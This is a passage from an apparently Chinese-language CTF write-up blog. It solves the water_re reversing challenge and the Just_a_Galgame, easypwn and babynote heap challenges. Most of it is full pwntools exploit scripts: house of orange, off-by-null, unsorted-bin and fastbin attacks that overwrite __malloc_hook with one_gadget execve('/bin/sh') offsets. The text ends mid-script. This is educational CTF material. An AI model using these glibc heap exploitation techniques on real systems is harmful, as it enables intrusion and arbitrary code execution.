class="hljs-string">'key'</span>,key)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    fmtpayload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">55</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>print(fmtpayload)payload = str(a) + fmtpayloadpayload +=<span class="hljs-string">'aaa'</span> + <span class="hljs-string">'b'</span> + p64(tag)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span> + p64(tag+<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span>  + p64(tag+<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span> + p64(tag+<span class="hljs-number">6</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span>s(payload)itr()</code></pre></div><div class="hljs"><pre><code class="hljs python">flag&#123;da8836b9e9df3db44fe4bd7f39d4f7ab&#125;</code></pre></div><h2 id="water-re"><a href="#water-re" class="headerlink" title="water_re"></a><code>water_re</code></h2><p>Ida反编译后的代码比较难看，发现重点数据造成了困难，就采取动态调试。</p><p>基本流程就是，gets一段你输入的flag，读入后用<code>sub_12f0_</code>进行处理，然后给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。其实也就是一个个字符来进行对比。</p><h3 id="sub-12F0-加密函数"><a href="#sub-12F0-加密函数" class="headerlink" title="sub_12F0_加密函数"></a><code>sub_12F0_</code>加密函数</h3><div class="hljs"><pre><code class="hljs python">_BYTE *__fastcall sub_12F0(_BYTE *a1)&#123;  _BYTE *result; // rax  int v2; // esi  __int64 v3; // r8  __int64 v4; // rdx  __int64 v5; // rax  int v6; // ecx  char v7; // r8  char v8; // dl  __asm &#123; endbr64 &#125;  result = (_BYTE *)sub_1090();  <span class="hljs-keyword">if</span> ( (signed int)result &lt;= <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> result;  v2 = (signed int)result;  v3 = (unsigned int)((_DWORD)result - <span class="hljs-number">1</span>);  v4 = <span class="hljs-number">0L</span>L;  do  &#123;    a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % <span class="hljs-number">7</span>]) + <span class="hljs-number">65</span>;    v5 = v4++;  &#125;  <span class="hljs-keyword">while</span> ( v3 != v5 );  v6 = <span class="hljs-number">0</span>;  do  &#123;    v7 = a1[<span class="hljs-number">3</span>];    result = a1 + <span class="hljs-number">3</span>;    do    &#123;      v8 = *(result-- - <span class="hljs-number">1</span>);      result[<span class="hljs-number">1</span>] = v8;    &#125;    <span class="hljs-keyword">while</span> ( a1 != result );    v6 += <span class="hljs-number">4</span>;    *a1 = v7;    a1 += <span class="hljs-number">4</span>;  &#125;  <span class="hljs-keyword">while</span> ( v2 &gt; v6 );  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>动态调试，进行起来很容易看懂。上来就是一个对输入的东西进行一个与<code>byte_4010</code>的字符<code>&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;</code> 7组来进行一个异或和+65。</p><p>然后下面：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">while</span> ( v3 != v5 ); v6 = <span class="hljs-number">0</span>; do &#123;   v7 = a1[<span class="hljs-number">3</span>];   result = a1 + <span class="hljs-number">3</span>;   do   &#123;     v8 = *(result-- - <span class="hljs-number">1</span>);     result[<span class="hljs-number">1</span>] = v8;   &#125;   <span class="hljs-keyword">while</span> ( a1 != result );   v6 += <span class="hljs-number">4</span>;   *a1 = v7;   a1 += <span class="hljs-number">4</span>; &#125;</code></pre></div><p>只看着让人头大，输入<code>flag{11111111111111111111111111111111111111111}</code> 动态调试一下发现：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/oqoJ2Y.png" srcset="/img/loading.gif" alt></p><p>分析这2组数据就会发现，每次对4个数据为一组进行处理。处理后结果就是原来的： <code>v1 &gt; v2 &gt; v3 &gt; v4</code> 变为 <code>v4 &gt; v1 &gt; v2 &gt; v3</code> 这样的结果。</p><p>然后处理完就给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。这肯定为一串处理过的字符串，ida中也可以找到，直接提取有点害怕提取错，动调时提取一下出来：</p><div class="hljs"><pre><code class="hljs python">tag1=[<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>]</code></pre></div><p>也就是这一段数据。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>自己直接手动替换的数据。</p><div class="hljs"><pre><code class="hljs python">tag1=[<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>]tag2 = [<span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>,<span class="hljs-number">0x54</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x5C</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>,<span class="hljs-number">0x6D</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>,<span class="hljs-number">0x5E</span>]qwkey = [<span class="hljs-string">'Q'</span>, <span class="hljs-string">'W'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>, <span class="hljs-string">'g'</span>, <span class="hljs-string">'s'</span>]flag = <span class="hljs-string">''</span>i = <span class="hljs-number">0</span>j = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(tag2)):    <span class="hljs-keyword">if</span> j ==<span class="hljs-number">7</span>:        j = <span class="hljs-number">0</span>    flag += chr((tag2[i] - <span class="hljs-number">65</span>) ^ ord(qwkey[j % <span class="hljs-number">7</span>]))    j += <span class="hljs-number">1</span>print(str(flag))</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/7JWt2B.png" srcset="/img/loading.gif" alt><br>估计没有提取全，但是也很容易知道flag了。</p><div class="hljs"><pre><code class="hljs python">flag&#123;QWB_water_problem_give_you_the_score&#125;</code></pre></div><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a><code>Just_a_Galgame</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>题目提醒了是house of orange，那就想着这样利用即可。现在house of orange的思想，统指主要是针对没有free的堆题，其改top chunk，然后申请一个大点的chunk，来进行获取一个进入unsortbin 的堆块。没有如最早的很经典的利用unsortbin attack 和 io 结合来获取shell。</p><p>题目的case2 <code>Invite her to go to a movie.</code> 中：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"movie name &gt;&gt; "</span>, &amp;buf);          v4 = atoi((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;buf);          read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)(qword_404060[v4] + <span class="hljs-number">0x60</span>), <span class="hljs-number">0x10</span>uLL);</code></pre></div><p>由于其是在加0x60之后读取，且在case 1 只是malloc(0x68)，所以在此处可以溢出8个字节，改写到 top chunk。</p><p>并且case3：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"You are the apple of my eyes too!"</span>);        qword_404098 = (__int64)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);        ++v12;</code></pre></div><p>可以给你申请0x1000的堆块，这就可以实现了house of orange。</p><p>在case5中：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"\nHotaru: Won't you stay with me for a while? QAQ\n"</span>);      read(<span class="hljs-number">0</span>, &amp;key, <span class="hljs-number">8u</span>LL);</code></pre></div><p>会给<code>0x4040A0</code> 读一段数据。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/RNbigg.png" srcset="/img/loading.gif" alt><br>是紧挨着堆块的。然而在case2中在edit时也没有对堆块序号的检查,让个人输入个8 即可取到这里，进行编辑。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>house of orange来获取一个unsortbin </li><li>申请一个堆块，会在这个old top chunk中，切出一个堆块，其上会存在libc的相关地址</li><li>show一下，泄漏出libc base</li><li>leave <code>__malloc_hook - 0x60</code>的地址在<code>key</code> 处，然后进行编辑这里的数据。</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./Just_a_Galgame'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">"&gt;&gt;"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add100</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">(buf)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)    s(str(buf))add()payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0xd41</span>)edit(<span class="hljs-number">0</span>,payload)add100()add()show()ru(<span class="hljs-string">'1: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ec2a0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)leave(p64(libc_base + <span class="hljs-number">0x3ebc30</span> - <span class="hljs-number">0x60</span>))one_rec = <span class="hljs-number">0x4f3c2</span> + libc_baseedit(<span class="hljs-number">8</span>,p64(one_rec))add()itr()</code></pre></div><p>还是挺简单的，比赛时竟然没有看这个题。</p><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !mallopt(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) )    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</code></pre></div><ul><li><p>禁用了fastbin，原理就是修改<code>global_max_fast</code> = 0x10</p></li><li><p>存在off by null</p></li><li><p>没有show功能</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3></li><li><p>利用off by null ，修改unsorted bin 的bk为<code>global_max_fast - 0x10</code></p></li><li><p>利用unsorted bin 攻击 <code>global_max_fast</code></p></li><li><p>接着fastbin attack 打io file的stdout，泄漏libc</p></li><li><p>接着fastbin attack打 <code>malloc_hook</code> 为one gadget</p></li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./easypwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'39.101.184.181'</span>,<span class="hljs-number">10000</span>)    libc = elf.libc    <span class="hljs-comment"># libc = ELF('./libc-easypwn.so')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span>    add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#3</span>    add(<span class="hljs-number">0x40</span>)    delete(<span class="hljs-number">0</span>)    <span class="hljs-comment">#null off by one</span>    edit(<span class="hljs-number">1</span>,<span class="hljs-string">'d'</span>*<span class="hljs-number">0x90</span> + p64(<span class="hljs-number">0xa0</span> + <span class="hljs-number">0x40</span>))    delete(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0xe8</span> - <span class="hljs-number">0x30</span>)    add(<span class="hljs-number">0xe8</span>)    add(<span class="hljs-number">0x20</span>)    delete(<span class="hljs-number">2</span>)    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) +p64(<span class="hljs-number">0</span>)+ p16(<span class="hljs-number">0x57f8</span>- <span class="hljs-number">0x10</span>) + <span class="hljs-string">'\n'</span>    edit(<span class="hljs-number">1</span>,payload)    add(<span class="hljs-number">0xe8</span>)    delete(<span class="hljs-number">2</span>)    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p16(<span class="hljs-number">0x45cf</span>) + <span class="hljs-string">'\n'</span>    edit(<span class="hljs-number">1</span>,payload)    add(<span class="hljs-number">0xe8</span>)    add(<span class="hljs-number">0xe8</span>)    edit(<span class="hljs-number">6</span>, <span class="hljs-string">'b'</span> * <span class="hljs-number">0x41</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>) + <span class="hljs-string">'\n'</span>)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./easypwn'</span>)        <span class="hljs-comment"># io = remote('39.101.184.181',10000)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)delete(<span class="hljs-number">2</span>)edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_2_1_stdin_'</span>] + <span class="hljs-number">143</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0xe8</span>)add(<span class="hljs-number">0xe8</span>)edit(<span class="hljs-number">7</span>,<span class="hljs-string">'\0'</span> * <span class="hljs-number">0xe1</span> + p32(<span class="hljs-number">0xf1</span>) + <span class="hljs-string">'\n'</span>)delete(<span class="hljs-number">2</span>)edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_2_1_stdin_'</span>] + <span class="hljs-number">376</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0xe8</span>)add(<span class="hljs-number">0xe8</span>)rec = libc_addr + <span class="hljs-number">0xf0364</span><span class="hljs-comment"># realloc = libc_addr + libc.symbols['realloc'] + realloc[1]</span>payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0xa0</span> + p64(rec) + p64(rec) + <span class="hljs-string">'\n'</span>edit(<span class="hljs-number">8</span>, payload)info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)add(<span class="hljs-number">0xe8</span>)itr()<span class="hljs-comment"># 0x45226 execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   rax == NULL</span><span class="hljs-comment"># 0x4527a execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x30] == NULL</span><span class="hljs-comment"># 0xf0364 execve("/bin/sh", rsp+0x50, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x50] == NULL</span><span class="hljs-comment"># 0xf1207 execve("/bin/sh", rsp+0x70, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x70] == NULL</span></code></pre></div><h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h4 id="regist"><a href="#regist" class="headerlink" title="regist()"></a>regist()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">strcpy</span>(name, &amp;s);</code></pre></div><div class="hljs"><pre><code class="hljs c">__isoc99_scanf(<span class="hljs-string">"%lld"</span>, &amp;age1); <span class="hljs-comment">// 长整数</span></code></pre></div><p>可能造成溢出。在栈中，其下面紧挨着age。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/n2fCnS.png" srcset="/img/loading.gif" alt></p><p>在bss段，其下面紧挨着heap存放的地址。</p><h4 id="addnote"><a href="#addnote" class="headerlink" title="addnote()"></a>addnote()</h4><ul><li>只能申请6个堆。</li><li>申请了一个堆，其size放在距离其堆地址·<code>6 * 8</code>的位置。</li><li>可以根据堆序号申请堆，判断堆序号是否存在的依据：此堆对应的size位有没有数值（也适用于shownote，deletenote,editnote）<h4 id="deletenote"><a href="#deletenote" class="headerlink" title="deletenote()"></a>deletenote()</h4></li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">3</span> )                                <span class="hljs-comment">// 可以输入负数</span>  &#123;    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">0xA</span>LL)] )    &#123;      <span class="hljs-built_in">free</span>(*(<span class="hljs-keyword">void</span> **)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">4L</span>L)]);<span class="hljs-comment">// 反编译错了 是8 *（xx）</span>      *(_QWORD *)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">0xA</span>LL)] = <span class="hljs-number">0L</span>L;<span class="hljs-comment">//uaf heap没有清0,size 清0</span>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);    &#125;</code></pre></div><ul><li>存在uaf</li><li>只能删除<code>idx&lt;=3</code> 的堆</li><li>可以输入负堆号，可以根据其逻辑来删除一些特殊的堆</li></ul><h4 id="editnote"><a href="#editnote" class="headerlink" title="editnote()"></a>editnote()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">3</span> &amp;&amp; v1 &gt;= <span class="hljs-number">0</span> )</code></pre></div><ul><li>只能编辑前4个堆</li></ul><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>leak libc</li><li>free(-1) free(-2) 删除掉motto name的堆块</li><li>利用reset，调用regist，利用strcpy来溢出age的数值，控制第一个chunk的size，造成一个堆块重叠</li><li>删除0、1、2chunk，申请一个大的chunk，可以覆盖到chunk 1的fd从而修改，进行fastbin attack</li><li>打malloc hook 为 one gadget</li></ul><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babynotes'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span 